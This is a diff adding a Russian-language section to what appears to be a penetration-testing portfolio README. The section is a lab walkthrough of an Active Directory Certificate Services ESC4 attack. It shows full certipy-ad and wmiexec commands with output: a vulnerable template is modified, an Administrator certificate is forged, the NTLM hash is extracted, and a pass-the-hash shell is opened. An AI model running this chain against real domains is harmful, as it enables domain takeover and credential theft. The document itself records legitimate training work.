@@ -527,6 +527,177 @@
 
     В результате этих действий были получены кофиденциальные данные в файле `id_rsa`.
 
+### Кейс Active Directory
+
+**Задача**
+
+* Выполнить разведку и обнаружить шаблоны сертификатов, уязвимые для атаки
+
+* Повысить свои привилегии в домене `Active Directory`
+
+* Увести опреленный секрет из домашней директории администратора
+
+**Задействованные инструменты**
+
+* Certipy-ad
+
+* Wmiexec
+
+**Шаги выполнения**
+
+1. Выполняю перечисление сервера `ADCS`:
+
+    ```
+    ~$ certipy-ad find -u '<user1@lab.local>' -p '<password>' -dc-ip <DC IP> -stdout -vulnerable
+
+    <SNIP>
+    2                                                                                                                                               
+        Template Name                       : ESC4                                                                                                    
+        Display Name                        : ESC4
+        Certificate Authorities             : lab-LAB-DC-CA
+        Enabled                             : True
+        Client Authentication               : False
+        Enrollment Agent                    : False
+        Any Purpose                         : False
+        Enrollee Supplies Subject           : False
+        Certificate Name Flag               : SubjectRequireDirectoryPath
+                                              SubjectRequireEmail
+                                              SubjectAltRequireEmail
+                                              SubjectAltRequireUpn
+        Enrollment Flag                     : AutoEnrollment
+                                              PublishToDs
+                                              IncludeSymmetricAlgorithms
+        Private Key Flag                    : 16777216
+                                              65536
+                                              ExportableKey
+        Extended Key Usage                  : Encrypting File System
+                                              Secure Email
+        Requires Manager Approval           : False
+        Requires Key Archival               : False
+        Authorized Signatures Required      : 0
+        Validity Period                     : 99 years
+        Renewal Period                      : 6 weeks
+        Minimum RSA Key Length              : 2048
+        Permissions
+          Enrollment Permissions
+            Enrollment Rights               : LAB.LOCAL\Domain Admins
+                                              LAB.LOCAL\Domain Users
+                                              LAB.LOCAL\Enterprise Admins
+          Object Control Permissions
+            Owner                           : LAB.LOCAL\Administrator
+            Full Control Principals         : LAB.LOCAL\<user1>
+            Write Owner Principals          : LAB.LOCAL\Domain Admins
+                                              LAB.LOCAL\Enterprise Admins
+                                              LAB.LOCAL\Administrator
+                                              LAB.LOCAL\<user1>
+            Write Dacl Principals           : LAB.LOCAL\Domain Admins
+                                              LAB.LOCAL\Enterprise Admins
+                                              LAB.LOCAL\Administrator
+                                              LAB.LOCAL\<user1>
+            Write Property Principals       : LAB.LOCAL\Domain Admins
+                                              LAB.LOCAL\Enterprise Admins
+                                              LAB.LOCAL\Administrator
+                                              LAB.LOCAL\<user1>
+        [!] Vulnerabilities
+          ESC4                              : 'LAB.LOCAL\\<user1>' has dangerous permissions
+   ```
+
+2. Модифицирую уязвимый шаблон:
+
+    ```
+    ~$ certipy-ad template -u 'user1@lab.local' -p 'password' -template ESC4 -save-old
+    Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+    [*] Saved old configuration for 'ESC4' to 'ESC4.json'
+    [*] Updating certificate template 'ESC4'
+    [*] Successfully updated 'ESC4'
+    ```
+
+    Итог модификации:
+
+    ```
+    <SNIP>
+    2                                                                      
+        Template Name                       : ESC4                           
+        Display Name                        : ESC4                                                                                                    
+        Certificate Authorities             : lab-LAB-DC-CA                  
+        Enabled                             : True                                                                                                    
+        Client Authentication               : True                                                                                                    
+        Enrollment Agent                    : True                           
+        Any Purpose                         : True                   
+        Enrollee Supplies Subject           : True                   
+        Certificate Name Flag               : EnrolleeSuppliesSubject    
+        Enrollment Flag                     : None                   
+        Private Key Flag                    : 16777216
+                                              65536
+                                              ExportableKey
+        Requires Manager Approval           : False
+        Requires Key Archival               : False                  
+        Authorized Signatures Required      : 0
+        Validity Period                     : 5 years
+        Renewal Period                      : 6 weeks
+        Minimum RSA Key Length              : 2048
+        Permissions
+          Object Control Permissions
+            Owner                           : LAB.LOCAL\Administrator
+            Full Control Principals         : LAB.LOCAL\Authenticated Users
+            Write Owner Principals          : LAB.LOCAL\Authenticated Users
+            Write Dacl Principals           : LAB.LOCAL\Authenticated Users
+            Write Property Principals       : LAB.LOCAL\Authenticated Users
+        [!] Vulnerabilities
+          ESC1                              : 'LAB.LOCAL\\Authenticated Users' can enroll, enrollee supplies subject and template allows client authentication
+          ESC2                              : 'LAB.LOCAL\\Authenticated Users' can enroll and template can be used for any purpose
+          ESC3                              : 'LAB.LOCAL\\Authenticated Users' can enroll and template has Certificate Request Agent EKU set
+          ESC4                              : 'LAB.LOCAL\\Authenticated Users' has dangerous permissions
+    ```
+
+3. Запрашиваю сертификат с помощью измененного шаблона с измененным `SAN`:
+
+    ```
+    ~$ certipy-ad req -u 'user1@lab.local' -p 'password' -dc-ip <DC_IP> -ca <FQDN_CA> -template <templateName> -upn Administrator@lab.local
+    Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+    [*] Requesting certificate via RPC
+    [*] Successfully requested certificate
+    [*] Request ID is 64
+    [*] Got certificate with UPN 'Administrator'
+    [*] Certificate has no object SID
+    [*] Saved certificate and private key to 'administrator.pfx'
+    ```
+
+4. Выполняется атака `UnpackTheHash` для извлечения `NTLM`-хеша пользователя:
+
+    ```
+    ~$ certipy-ad auth -pfx administrator.pfx -domain lab.local
+    Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+    [*] Using principal: administrator@lab.local
+    [*] Trying to get TGT...
+    [*] Got TGT
+    [*] Saved credential cache to 'administrator.ccache'
+    [*] Trying to retrieve NT hash for 'administrator'
+    [*] Got hash for 'administrator@lab.local': aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfd******************
+    ```
+
+5. Выполняется атака `PassTheHash`:
+    
+    ```
+    ~$ wmiexec.py -hashes ":2b576acbe6bcfd******************" Administrator@lab.local
+    Impacket v0.11.0 - Copyright 2023 Fortra
+
+    [*] SMBv3.0 dialect used
+    [!] Launching semi-interactive shell - Careful what you execute
+    [!] Press help for extra shell commands
+    C:\> whoami
+    lab\administrator
+    ```
+
+6. Извлекаем секрет:
+
+    ```
+    C:\> more C:\Users\Administrator\Desktop\<secret>
+    ```
+
 ### Дипломный поект в Нетологии
 
 #### Track Penetration Testing
